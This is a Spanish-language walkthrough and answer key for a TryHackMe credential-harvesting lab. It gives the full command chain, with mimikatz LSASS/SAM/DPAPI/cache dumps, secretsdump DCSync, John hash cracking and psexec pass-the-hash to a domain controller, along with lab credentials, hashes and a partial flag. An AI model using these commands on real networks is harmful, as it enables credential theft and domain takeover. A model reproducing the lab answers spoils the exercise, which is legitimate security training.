# Intro to Credential Harvesting

| **Dificultad** | MEDIUM | **Tipo** | Premium (requiere suscripción) | **Slug** | `introtocredentialharvesting` |
| **Link** | [TryHackMe](https://tryhackme.com/room/introtocredentialharvesting) | **Sección** | 02 Level Medium | **Fuente** | texto oficial THM + anotaciones propias |
| **Componentes** | Credential Harvesting / Windows / Active Directory / Mimikatz / LSASS / NTDS.dit / Pass-the-Hash | **Impacto** | Evalúa la cadena completa de extracción de credenciales de Windows hasta Domain Admin |

---

**Contexto:** Sala centrada en el robo de credenciales en entornos Windows/Active Directory: las cinco tiendas de credenciales (LSASS, SAM+SYSTEM, LSA Secrets, DPAPI Vault, NTDS.dit). Encadenando estas tiendas se pasa de local Administrator en un workstation a Domain Admin en el DC, sin exploits, solo usando las credenciales que Windows ya tenía guardadas.

## Solucionario

### Task 1: Tiendas de Credenciales en Windows / Active Directory

**Explicación:** Tiendas de credenciales:
- **LSASS Memory:** guarda hashes NTLM/LM, tickets Kerberos y a veces credenciales en texto plano. Con acceso SYSTEM se vuelca LSASS. *Herramienta:* mimikatz → `sekurlsa::logonpasswords`
- **SAM + SYSTEM Hives:** almacena hashes de contraseñas de usuarios locales, encriptados con una clave del hive SYSTEM. *Herramientas:* reg export, mimikatz → `lsadump::sam`
- **LSA Secrets** (bajo `HKLM\SECURITY\Policy\Secrets`): credenciales de dominio cacheadas, credenciales de servicio en texto plano y a veces passwords de RDP. *Herramienta:* secretsdump.py con credenciales de admin local.
- **DPAPI Vault:** secreto de apps (Wi-Fi, RDP, contraseñas de navegador) usando la master key del usuario. *Herramienta:* mimikatz → `vault::list` + `vault::cred /export`
- **NTDS.dit:** en Domain Controllers, la base de datos de AD con los hashes NTLM y claves Kerberos de cada cuenta de dominio. *Herramientas:* secretsdump.py → `-just-dc`, mimikatz → `lsadump::dcsync`

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué componente de Windows almacena credenciales NTLM y Kerberos activas en memoria? | `LSASS` |
| 2 | ¿Qué archivo en el directorio `C:\Windows\NTDS\` contiene la base de datos de AD? | `ntds.dit` |
| 3 | ¿Qué comando de Mimikatz exporta credenciales del DPAPI Vault? | `vault::cred /export` |

### Task 2: Conexión al Objetivo

**Explicación:** Credenciales de administrador local proporcionadas:
- Username: `Administrator`
- Password: `N3w34829DJdd?1`
- Target IP: `10.220.10.20`

Conexión RDP:
```bash
xfreerdp /u:Administrator /p:'N3w34829DJdd?1' /v:10.220.10.20
```

### Task 3: Paso 1 - Volcado de LSASS Memory

**Explicación:**
```text
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```
Encontrados:
- `svc-app` → password `S3rv!c3A***!`
- `ElonTusk` web creds → password `MyTusksAreTha***`

### Task 4: Paso 2 - Volcado de DPAPI Vault

**Explicación:**
```text
mimikatz # vault::list
mimikatz # vault::cred /export
```
Confirma los mismos dos secretos (svc-app + Gmail de ElonTusk).

### Task 5: Paso 3 - Extraer SAM + SYSTEM Hives

**Explicación:** PowerShell:
```powershell
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
```
mimikatz:
```text
mimikatz # lsadump::sam /sam:SAM /system:SYSTEM
```
Dump de hashes de cuentas locales (Administrator, Guest, ElonTusk).

### Task 6: Paso 4 - Credenciales de Dominio Cacheadas

**Explicación:**
```text
mimikatz # token::elevate
mimikatz # lsadump::cache
```
Se obtienen hashes MSCacheV2 para usuarios de dominio (`raoulduke`, `svc-app`, `Administrator`).

### Task 7: Paso 5 - Secretsdump (Volcado Remoto)

**Explicación:** Kali:
```bash
secretsdump.py WRK/Administrator:'N3w34829DJdd?1'@10.220.10.20 -output local_dump
```
Extrae hashes locales + logons de dominio cacheados.

Cracking del hash MSCache de **drgonzo** con John:
```bash
john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Password revelada: `lasve***1`.

### Task 8: Paso 6 - Volcado de NTDS.dit del DC

**Explicación:**
```bash
secretsdump.py TRYHACKME/drgonzo:'lasve***1'@10.220.10.10 -just-dc -output dc_dump
```
Se obtiene el dump de NTDS.dit, incluyendo el hash NTLM del Domain Administrator:
`d71ee9fb6a3f5****6bdc6c941f7a2903`

### Task 9: Paso 7 - Pass-the-Hash al Domain Controller

**Explicación:**
```bash
psexec.py 'TRYHACKME/Administrator@10.220.10.10' -hashes :d71ee9fb6a3f5****6bdc6c941f7a2903
```
Shell como **NT AUTHORITY\SYSTEM** en el DC.

### Task 10: Paso 8 - Flag Final

**Explicación:**
```cmd
cd C:\Users\Administrator\Desktop
type flag.txt
```
**Flag:** `THM{gotta_l0ve_**********_st0res}`

Nota: las respuestas de las tareas 1-10 corresponden al recorrido práctico documentado; los valores con `***` representan partes redactadas por los writeups públicos.

---

**Metodología:**
1. Volcado de credenciales de LSASS con mimikatz (`sekurlsa::logonpasswords`) tras `privilege::debug`.
2. Volcado del DPAPI Vault (`vault::list`, `vault::cred /export`).
3. Extracción de SAM + SYSTEM hives (`reg save`) y dump con `lsadump::sam`.
4. Cracking de hashes MSCacheV2 con `john --format=mscash2 --wordlist=rockyou.txt`.
5. Volcado remoto con secretsdump.py y pass-the-hash al DC con psexec.py.
6. Lectura de `flag.txt` como SYSTEM.

**Learning chain:** Administrator local (RDP) → LSASS dump (privilege::debug / sekurlsa::logonpasswords) → DPAPI vault → SAM+SYSTEM hives → lsadump::sam → Cached domain creds (lsadump::cache / MSCacheV2) → secretsdump remoto → John mscash2 crack → NTDS.dit (secretsdump -just-dc) → Pass-the-hash psexec → NT AUTHORITY\SYSTEM en DC → flag.txt

**Lección:** *Windows guarda un tesoro de credenciales en memoria, registry y DCs. Encadenando las cinco tiendas (LSASS, SAM, LSA Secrets, DPAPI, NTDS.dit) se escala de un workstation comprometido al Domain Controller sin usar ningún exploit.*

**MITRE ATT&CK:** T1003.001 - OS Credential Dumping: LSASS Memory; T1003.002 - OS Credential Dumping: Security Account Manager; T1003.004 - OS Credential Dumping: LSA Secrets; T1003.006 - OS Credential Dumping: DCSync; T1555.004 - Credentials from Password Stores: Windows Credential Manager; T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket

**Fuente:** [TryHackMe - Intro to Credential Harvesting](https://tryhackme.com/room/introtocredentialharvesting)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
